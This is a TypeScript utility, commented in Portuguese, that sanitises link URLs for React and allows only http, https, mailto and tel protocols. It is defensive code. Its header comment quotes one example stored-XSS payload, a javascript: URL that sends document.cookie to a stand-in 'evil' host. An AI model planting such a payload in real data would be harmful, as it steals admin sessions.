/**
 * Devolve uma URL segura para colocar em `<a href={...}>`.
 *
 * Motivação (CRIT-14 do code review): React NÃO bloqueia `javascript:` em
 * `href`. Qualquer registro do banco com `documento_url =
 * "javascript:fetch('https://evil/?c='+document.cookie)"` vira RCE no
 * clique de um admin. `rel="noopener"` não defende contra isso.
 *
 * Regras:
 *  - Aceita apenas os protocolos http/https/mailto/tel.
 *  - URLs relativas ("/x/y") são resolvidas contra `window.location.origin`
 *    e passam se o protocolo final for permitido.
 *  - Tudo mais (javascript:, data:, vbscript:, file:, ftp:, etc.) vira "#".
 *  - Entrada nula/inválida também vira "#".
 *
 * Uso:
 *   import { safeHref } from '@/lib/safeHref';
 *   <a href={safeHref(item.documento_url)} target="_blank" rel="noreferrer">…</a>
 */

const ALLOWED_PROTOCOLS = new Set(['http:', 'https:', 'mailto:', 'tel:']);

export function safeHref(input: string | null | undefined): string {
  if (typeof input !== 'string' || !input.trim()) return '#';
  const raw = input.trim();

  // URLs relativas ("/x", "foo/bar") passam se resolvem em protocolo permitido.
  const base =
    typeof window !== 'undefined' && window.location
      ? window.location.origin
      : 'https://cbrio.local';

  try {
    const parsed = new URL(raw, base);
    return ALLOWED_PROTOCOLS.has(parsed.protocol) ? raw : '#';
  } catch {
    return '#';
  }
}

export default safeHref;
